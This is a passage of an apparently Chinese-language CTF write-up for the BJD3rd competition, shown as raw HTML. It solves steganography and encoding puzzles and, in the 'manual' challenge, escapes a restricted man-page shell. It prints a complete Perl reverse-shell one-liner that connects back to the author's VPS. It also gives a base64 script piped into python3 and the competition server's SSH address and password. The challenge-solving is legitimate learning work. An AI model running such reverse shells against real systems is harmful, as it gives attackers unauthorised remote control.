class="literal">null</span>,<span class="literal">null</span>,[[<span class="string">"1VbfGqSSHlM9D_HY1TsENa6rle3axBYbtKdyHS_klYDLG5g"</span>,<span class="literal">null</span>,[<span class="number">740</span>,<span class="number">371</span>,<span class="number">0</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,[<span class="number">1877231084</span>,<span class="string">"Which part of the Great Wall is this?"</span>,<span class="string">"In Huairou Distric"</span>,<span class="number">0</span>,[[<span class="number">1337434564</span>,<span class="literal">null</span>,<span class="number">0</span>,<span class="literal">null</span>,[[<span class="number">4</span>,<span class="number">302</span>,[<span class="string">"Hefangkou|hefangkou"</span>]</span><br><span class="line">,<span class="string">"427e"</span>]</span><br></pre></td></tr></table></figure><p>flag为答案后面拼起来的字符：d41d8cd98f00b204e9800998ecf8427e</p><hr><h3 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h3><p>打开网址，一张图，下载zip，密码说是那个password_is_here<img src="https://i.loli.net/2020/05/23/67DIfmYgjRL4cCN.png" alt></p><p>然后F12发现</p><p><img src="https://i.loli.net/2020/05/23/9MsAQykx1nlDcdX.png" alt></p><p>于是想到可能是宽字节隐写，然后找到在线工具<a href="https://offdev.net/demos/zwsp-steg-js" target="_blank" rel="noopener">网站</a>解密，得到<code>zerowidthcharactersinvisible</code>，解压后得到一张倒叙的图，脚本一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = open(<span class="string">'f14g.png'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line">f = a[::<span class="number">-1</span>]</span><br><span class="line">b = open(<span class="string">'flag.png'</span>,<span class="string">'wb'</span>).write(f)</span><br></pre></td></tr></table></figure><p>得到一堆奇怪字符</p><p><img src="https://i.loli.net/2020/05/23/7I9ohuP5EpLb31g.png" alt></p><p>前三个是MINIMOYS, 4-6是银河密码，7-9是跳舞的小人，最后两个是鸟图腾</p><p>得到</p><p>UVWHZAITWAU</p><p>所以flag：MD5(‘BJD{UVWHZAITWAU}’)</p><hr><h3 id="bin-cat-2"><a href="#bin-cat-2" class="headerlink" title="/bin/cat 2"></a>/bin/cat 2</h3><p>进去后是一张大的图片，里面有很多 小的图片，小的图片有两种。</p><p>然后如果将页面缩小，可以隐约看到一个二维码</p><p>所以方法一：写脚本脚本，然后生成二维码，再将图片替换——长度减一半，扫二维码后md5即可</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">p1 = Image.open(<span class="string">'11.png'</span>).convert(<span class="string">'RGB'</span>)<span class="comment">#第一种类型的图片</span></span><br><span class="line">p2 = Image.open(<span class="string">'12.png'</span>).convert(<span class="string">'RGB'</span>)<span class="comment">#第二种类型的图片</span></span><br><span class="line">a,b = p1.size</span><br><span class="line">dif = []</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">        <span class="keyword">if</span> p1.getpixel((x,y))!=p2.getpixel((x,y)):</span><br><span class="line">            dif.append((x,y))</span><br><span class="line">mark = dif[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">p = Image.open(<span class="string">'res.png'</span>).convert(<span class="string">'RGB'</span>)<span class="comment">#最大的一张图片</span></span><br><span class="line">aa,bb = p.size</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>,bb,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,aa,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">if</span> p.getpixel((x+mark[<span class="number">0</span>],y+mark[<span class="number">1</span>])) == p1.getpixel(mark):</span><br><span class="line">            data.append(<span class="string">'1'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data.append(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">B = Image.new(<span class="string">'L'</span>,(<span class="number">10</span>,<span class="number">10</span>),<span class="number">255</span>)</span><br><span class="line">W = Image.new(<span class="string">'L'</span>,(<span class="number">10</span>,<span class="number">10</span>),<span class="number">0</span>)</span><br><span class="line">np = Image.new(<span class="string">'L'</span>,(<span class="number">290</span>,<span class="number">290</span>),<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">29</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">29</span>):</span><br><span class="line">        <span class="keyword">if</span> data[x+<span class="number">29</span>*y] == <span class="string">'0'</span>:</span><br><span class="line">            np.paste(B,(<span class="number">10</span>*x,<span class="number">10</span>*y))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            np.paste(W,(<span class="number">10</span>*x,<span class="number">10</span>*y))</span><br><span class="line">np.save(<span class="string">'r.png'</span>)</span><br><span class="line">pp = Image.open(<span class="string">'r.png'</span>)</span><br><span class="line">barcodes = decode(pp)</span><br><span class="line"><span class="keyword">for</span> barcode <span class="keyword">in</span> barcodes:</span><br><span class="line">    barcodeData = barcode.data.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    print(hashlib.md5(barcodeData.encode()).hexdigest())</span><br></pre></td></tr></table></figure><p>方法二：直接截图，然后放进Stegsolve，改一下色道可以得到</p><p><img src="https://i.loli.net/2020/05/24/k7LxYFi5AZMs9cz.jpg" alt>然后改一下宽高，就能扫出来了（支付宝扫码能力比较强）。</p><hr><h3 id="manual"><a href="#manual" class="headerlink" title="manual"></a>manual</h3><p>首先ssh链接，得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">% ssh ctf@183.129.189.60 -p 10128</span><br><span class="line"></span><br><span class="line">Welcome to BJD3rd Games ~</span><br><span class="line"></span><br><span class="line">🐀🐾🌴🚜🍋🐊🍇🐂🍓🎑🐈🐟💁🚟🍗</span><br><span class="line"></span><br><span class="line">The above login passwd is encrypted.</span><br><span class="line"></span><br><span class="line">leads:</span><br><span class="line"> - http://emoji.taqini.space</span><br><span class="line"> - suika</span><br><span class="line"></span><br><span class="line">Try to figure out <span class="built_in">where</span> is your</span><br><span class="line"></span><br><span class="line">         <span class="comment">#           #####   #####  </span></span><br><span class="line"><span class="comment">######  ##     ##   #     # #     #</span></span><br><span class="line"><span class="comment">#      # #    #  #  #     #       #</span></span><br><span class="line"><span class="comment">#####    #   #    #  ######    ###  </span></span><br><span class="line"><span class="comment">#        #   ######       #    #    </span></span><br><span class="line"><span class="comment">#        #   #    # #     #         </span></span><br><span class="line"><span class="comment">#      ##### #    #  #####     #    </span></span><br><span class="line">                                    </span><br><span class="line">p.s. Maybe you have lots of xiaowenhao after login,</span><br><span class="line">     I will <span class="built_in">help</span> u look up the manual pages of flag.</span><br><span class="line"></span><br><span class="line">Now, input passwd to start the game:</span><br></pre></td></tr></table></figure><p>上面那个网址就是虎符misc中的emoji替代加密，密钥是<code>suika</code>，他是一种替代加密，去网址得到字典后脚本替代得到ssh密码：<code>C0dEmOj!so4UnNy</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">'🌷👱🌠🌴👷🎆🍀👼🎉🍇👰🎍🍋💁🎑🍏🚶🎁🍓💑🏀🍄💪🎳🍗👆😶🚘🐀😮🚜🐻😴⚓🐔😝🚢🐥😕🚟🐊😞🚥🐉😭🚽🐟😩⌛🐚😳☀😜😀🚆🐈😄🚊🐴😊🚌🐾🐂🐪🚏🐗😚🌹🚓🐁😑🚗👩😥'</span></span><br><span class="line">b = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+'</span></span><br><span class="line">ss = <span class="string">'🐀🐾🌴🚜🍋🐊🍇🐂🍓🎑🐈🐟💁🚟🍗'</span></span><br><span class="line">print(ss.translate(str.maketrans(a,b)))</span><br></pre></td></tr></table></figure><p>登录上去后是一个留言板加上一个自带的man flag指令，但是你不能退出man，退出man的话就直接退出了ssh，但是这个man又不是一般的man，他是w3mman，然后上面的<code>External Program Settings</code>中的<code>External browser</code>可以命令执行（这相当于是默认启动项，可以插入指令让它执行），使用perl来反弹shell，于是构建（网上百度）得<code>perl -e &#39;use Socket;$i=&quot;ip addr&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</code>，将shell反弹到VPS上，然后开始疯狂查看文件以及权限，得到<code>f1a9.py</code>为700权限，hint又说不用提权，然后看见run.sh里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"ctf:C0dEmOj!so4UnNy"</span> | chpasswd</span><br><span class="line">chown -R root:ctf /home/ctf/</span><br><span class="line">chmod 700 /home/ctf/f1a9.py</span><br><span class="line">chmod 750 /home/ctf/msh</span><br><span class="line">/home/ctf/f1a9.py &amp;</span><br><span class="line"></span><br><span class="line">/usr/sbin/sshd -D</span><br></pre></td></tr></table></figure><p>可以看到f1a9.py在启动是就在后台运行了，但是。。。我ps怎么弄，进入<code>/proc</code>读内存都没找到有用信息，但是官方突然给hint：<code>f1a9.py的独白：我的真实身份是web server</code>,于是恶向胆边生，俺爆破你端口，但是又因为服务器里没有nmap等可以三句话代码，使用python写进去一句话的扫描端口脚本</p><p>原码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">host = <span class="string">' http://127.0.0.1'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2000</span>,<span class="number">2500</span>):</span><br><span class="line">    add = host+<span class="string">':'</span>+str(i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = requests.get(add)</span><br><span class="line">        print(i)</span><br><span class="line">        print(s.text)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>一句话脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> aW1wb3J0IHJlcXVlc3RzCmhvc3QgPSAnIGh0dHA6Ly8xMjcuMC4wLjEnCmZvciBpIGluIHJhbmdlKDIwMDAsMjUwMCk6CiAgICBhZGQgPSBob3N0Kyc6JytzdHIoaSkKICAgIHRyeToKICAgICAgICBzID0gcmVxdWVzdHMuZ2V0KGFkZCkKICAgICAgICBwcmludChpKQogICAgICAgIHByaW50KHMudGV4dCkKICAgICAgICBleGl0KDEpCiAgICBleGNlcHQ6CiAgICAgICAgcHJpbnQoaSkKICAgICAgICBwYXNzCg== | base64 -d | python3</span><br></pre></td></tr></table></figure><p>得到了2333端口有网页，其内容为一堆base64编码：</p><p><img src="https://i.loli.net/2020/05/24/S6jkb9qFs2yhru4.png" alt="base64"></p><p>看到这么多base64，有可能就是base64隐写，脚本一把梭：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span><span class="params">(s1,s2)</span>:</span></span><br><span class="line">    table = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s1)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> abs(table.index(s1[i]) - table.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">()</span>:</span></span><br><span class="line">    lines = open(<span class="string">'stego.txt'</span>,<span class="string">'r'</span>).readlines()</span><br><span class="line">    bin_str = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        steg_line = line.replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">        <span class="comment"># print(steg_line)</span></span><br><span class="line">        norm_line = base64.b64encode(base64.b64decode(steg_line)).decode()</span><br><span class="line">        <span class="comment"># print(norm_line)</span></span><br><span class="line">        diff = get_base64_diff_value(steg_line,norm_line)</span><br><span class="line">        <span class="comment"># print(diff)</span></span><br><span class="line">        pad_num = steg_line.count(<span class="string">'='</span>)</span><br><span class="line">        <span class="keyword">if</span> diff:</span><br><span class="line">            bin_str += bin(diff)[<span class="number">2</span>:].zfill(pad_num*<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bin_str += <span class="string">'0'</span> * pad_num * <span class="number">2</span></span><br><span class="line">    print(bin_str)</span><br><span class="line">    res_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(int(len(bin_str)/<span class="number">8</span>)):</span><br><span class="line">        <span class="comment"># print(8*j,(j+1)*8)</span></span><br><span class="line">        res_str+=chr(int(bin_str[<span class="number">8</span>*j:(j+<span class="number">1</span>)*<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">    print(res_str[<span class="number">-52</span>:])</span><br><span class="line">    print(base64.b64decode(res_str[<span class="number">-52</span>:]))</span><br><span class="line"></span><br><span class="line">solve()</span><br></pre></td></tr></table></figure><p>得到hTtP://999.TaQini.SpAcE，上去后是</p><p><img src="https://i.loli.net/2020/05/23/VC6HvEDeI2PFWAy.png" alt></p><p>这玩意，f12后发现有一堆奇怪的表情js：</p><p><img src="https://i.loli.net/2020/05/24/lSd1q9EgKaILkDw.png" alt="js"></p><p>网上在线解密aaencode得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 半径，画布宽度，画布高度，画布x内边距，画布y内边距</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> R = <span class="number">26</span>, canvasWidth = <span class="number">400</span>, canvasHeight = <span class="number">320</span>, OffsetX = <span class="number">30</span>, OffsetY = <span class="number">30</span>;</span><br><span class="line"><span class="keyword">var</span> circleArr = [];</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">createCirclePoint</span><span class="params">(diffX, diffY)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> row = <span class="number">0</span>; row &lt; <span class="number">3</span>; row++) &#123;</span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">var</span> col = <span class="number">0</span>; col &lt; <span class="number">3</span>; col++) &#123;</span><br><span class="line">      <span class="comment">// 计算圆心坐标</span></span><br><span class="line">       <span class="keyword">var</span> Point = &#123;</span><br><span class="line">         X: (OffsetX + col * diffX + ( col * <span class="number">2</span> + <span class="number">1</span>) * R),</span><br><span class="line">         Y: (OffsetY + row * diffY + (row * <span class="number">2</span> + <span class="number">1</span>) * R)</span><br><span class="line">       &#125;;</span><br><span class="line">       circleArr.push(Point);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> window.onload = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">var</span> canvas = document.getElementById(<span class="string">"lockCanvas"</span>);</span><br><span class="line">   canvasWidth = document.body.offsetWidth;<span class="comment">//网页可见区域宽</span></span><br><span class="line">   canvas.width = canvasWidth;</span><br><span class="line">   canvas.height = canvasHeight;</span><br><span class="line">   <span class="keyword">var</span> ctx = canvas.getContext(<span class="string">"2d"</span>);</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 每行3个圆</span></span><br><span class="line"><span class="comment">    * OffsetX为canvas x方向内边距</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">   <span class="keyword">var</span> X = (canvasWidth - <span class="number">2</span> * OffsetX - R * <span class="number">2</span> * <span class="number">3</span>) / <span class="number">2</span>;</span><br><span class="line">   <span class="keyword">var</span> Y = (canvasHeight - <span class="number">2</span> * OffsetY - R * <span class="number">2</span> * <span class="number">3</span>) / <span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">   createCirclePoint(X, Y);</span><br><span class="line">   bindEvent(canvas, ctx);</span><br><span class="line">   <span class="comment">//CW=2*offsetX+R*2*3+2*X</span></span><br><span class="line">   Draw(ctx, circleArr, [],<span class="keyword">null</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">Draw</span><span class="params">(ctx, circleArr, pwdArr,touchPoint)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">var</span> eight = [<span class="string">"巽"</span>,<span class="string">"離"</span>,<span class="string">"坤"</span>,<span class="string">"震"</span>,<span class="string">"☯"</span>,<span class="string">"兌"</span>,<span class="string">"艮"</span>,<span class="string">"坎"</span>,<span class="string">"乾"</span>];</span><br><span class="line">   <span class="keyword">if</span> (pwdArr.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">     ctx.beginPath();</span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; pwdArr.length; i++) &#123;</span><br><span class="line">       <span class="keyword">var</span> pointIndex = pwdArr[i];</span><br><span class="line">       ctx.lineTo(circleArr[pointIndex].X, circleArr[pointIndex].Y);</span><br><span class="line">     &#125;</span><br><span class="line">     ctx.lineWidth = <span class="number">10</span>;</span><br><span class="line">     ctx.strokeStyle = <span class="string">"#713fdf"</span>;</span><br><span class="line">     ctx.stroke();</span><br><span class="line">     ctx.closePath();</span><br><span class="line">     <span class="keyword">if</span>(touchPoint!=<span class="keyword">null</span>)&#123;</span><br><span class="line">       <span class="keyword">var</span> lastPointIndex=pwdArr[pwdArr.length<span class="number">-1</span>];</span><br><span class="line">       <span class="keyword">var</span> lastPoint=circleArr[lastPointIndex];</span><br><span class="line">       ctx.beginPath();</span><br><span class="line">       ctx.moveTo(lastPoint.X,lastPoint.Y);</span><br><span class="line">       ctx.lineTo(touchPoint.X,touchPoint.Y);</span><br><span class="line">       ctx.stroke();</span><br><span class="line">       ctx.closePath();</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; circleArr.length; i++) &#123;</span><br><span class="line">     <span class="keyword">var</span> Point = circleArr[i];</span><br><span class="line">     ctx.fillStyle = <span class="string">"#713fdf"</span>;</span><br><span class="line">     ctx.beginPath();</span><br><span class="line">     ctx.arc(Point.X, Point.Y, R, <span class="number">0</span>, Math.PI * <span class="number">2</span>, <span class="keyword">true</span>);</span><br><span class="line">     ctx.closePath();</span><br><span class="line">     ctx.fill();</span><br><span class="line">     ctx.fillStyle = <span class="string">"#ffffff"</span>;</span><br><span class="line">     ctx.beginPath();</span><br><span class="line">     ctx.arc(Point.X, Point.Y, R - <span class="number">3</span>, <span class="number">0</span>, Math.PI * <span class="number">2</span>, <span class="keyword">true</span>);</span><br><span class="line">     ctx.closePath();</span><br><span class="line">     ctx.fill();</span><br><span class="line">     <span class="comment">// alert(Point.X+','+Point.Y)</span></span><br><span class="line">     <span class="comment">// var img = new Image();</span></span><br><span class="line">     <span class="comment">// img.src = "http://taqini.space/img/"+i+".png"; </span></span><br><span class="line">     <span class="comment">// ctx.drawImage(img,Point.X-20,Point.Y-20,40,40);</span></span><br><span class="line">  </span><br><span class="line">     <span class="comment">// if(pwdArr.indexOf(i)&gt;=0)&#123;</span></span><br><span class="line">     <span class="comment">//   ctx.fillStyle = "#713fdf";</span></span><br><span class="line">     <span class="comment">//   ctx.beginPath();</span></span><br><span class="line">     <span class="comment">//   ctx.arc(Point.X, Point.Y, R -16, 0, Math.PI * 2, true);</span></span><br><span class="line">     <span class="comment">//   ctx.closePath();</span></span><br><span class="line">     <span class="comment">//   ctx.fill();</span></span><br><span class="line">     <span class="comment">// &#125;</span></span><br><span class="line">  </span><br><span class="line">     ctx.font = <span class="string">'36px "微软雅黑"'</span>;</span><br><span class="line">     ctx.textBaseline = <span class="string">"bottom"</span>;</span><br><span class="line">     ctx.fillStyle = <span class="string">"#000000"</span>;</span><br><span class="line">     ctx.fillText(eight[i],Point.X<span class="number">-18</span>,Point.Y+<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 计算选中的密码 </span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">getSelectPwd</span><span class="params">(touches,pwdArr)</span></span>&#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; circleArr.length; i++) &#123;</span><br><span class="line">     <span class="keyword">var</span> currentPoint = circleArr[i];</span><br><span class="line">     <span class="keyword">var</span> xdiff = Math.abs(currentPoint.X - touches.pageX);</span><br><span class="line">     <span class="keyword">var</span> ydiff = Math.abs(currentPoint.Y - touches.pageY);</span><br><span class="line">     <span class="keyword">var</span> dir = Math.pow((xdiff * xdiff + ydiff * ydiff), <span class="number">0.5</span>);</span><br><span class="line">     <span class="keyword">if</span>(dir &gt; R || pwdArr.indexOf(i) &gt;= <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">      pwdArr.push(i);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 给画布绑定事件</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">bindEvent</span><span class="params">(canvas, ctx)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">var</span> pwdArr = [];</span><br><span class="line">   <span class="keyword">var</span> res;</span><br><span class="line">   canvas.addEventListener(<span class="string">"touchstart"</span>, <span class="function"><span class="keyword">function</span> <span class="params">(e)</span> </span>&#123;</span><br><span class="line">     getSelectPwd(e.touches[<span class="number">0</span>],pwdArr);</span><br><span class="line">   &#125;, <span class="keyword">false</span>);</span><br><span class="line">   canvas.addEventListener(<span class="string">"touchmove"</span>, <span class="function"><span class="keyword">function</span> <span class="params">(e)</span> </span>&#123;</span><br><span class="line">     e.preventDefault();</span><br><span class="line">     <span class="keyword">var</span> touches = e.touches[<span class="number">0</span>];</span><br><span class="line">     getSelectPwd(touches,pwdArr);</span><br><span class="line">     ctx.clearRect(<span class="number">0</span>,<span class="number">0</span>,canvasWidth,canvasHeight);</span><br><span class="line">     Draw(ctx,circleArr,pwdArr,&#123;X:touches.pageX,Y:touches.pageY&#125;);</span><br><span class="line">   &#125;, <span class="keyword">false</span>);</span><br><span class="line">   canvas.addEventListener(<span class="string">"touchend"</span>, <span class="function"><span class="keyword">function</span> <span class="params">(e)</span> </span>&#123;</span><br><span class="line">     ctx.clearRect(<span class="number">0</span>,<span class="number">0</span>,canvasWidth,canvasHeight);</span><br><span class="line">     